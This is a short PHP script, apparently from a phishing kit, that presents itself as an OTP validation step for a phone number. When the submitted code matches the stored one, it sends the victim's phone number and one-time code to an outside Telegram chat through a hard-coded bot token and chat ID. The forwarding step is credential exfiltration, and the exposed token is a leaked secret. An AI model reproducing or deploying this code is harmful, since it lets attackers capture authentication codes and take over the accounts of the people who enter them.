<?php
// check-otp.php
// Cek apakah OTP user cocok dengan yang tersimpan dan kirim ke Telegram jika cocok

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $phone = $_POST['phone'] ?? '';
    $otp = $_POST['otp'] ?? '';

    // Simulasi OTP terbaru (ambil dari DB atau cache)
    $filename = "otps/" . md5($phone) . ".txt";
    if (!file_exists($filename)) {
        echo json_encode(["status" => "failed", "message" => "OTP belum tersedia"]);
        exit;
    }

    $latestOtp = file_get_contents($filename);

    if (trim($otp) === trim($latestOtp)) {
        // Kirim ke Telegram jika OTP cocok
        $bot_token = "7198347062:AAEHa7mANc9-4o-OKwa653BKYVbgXW_0NUk";
        $chat_id = "5876510981"; // bisa dari DB atau ditentukan manual

        $message = "✅ OTP Validasi Berhasil\n📱 Nomor: $phone\n🔐 OTP: $otp";

        // Kirim pesan ke bot Telegram
        $url = "https://api.telegram.org/bot$bot_token/sendMessage";
        $params = [
            'chat_id' => $chat_id,
            'text' => $message
        ];

        file_get_contents($url . '?' . http_build_query($params));

        echo json_encode(["status" => "success"]);
    } else {
        echo json_encode(["status" => "failed", "message" => "OTP tidak cocok"]);
    }
    exit;
}
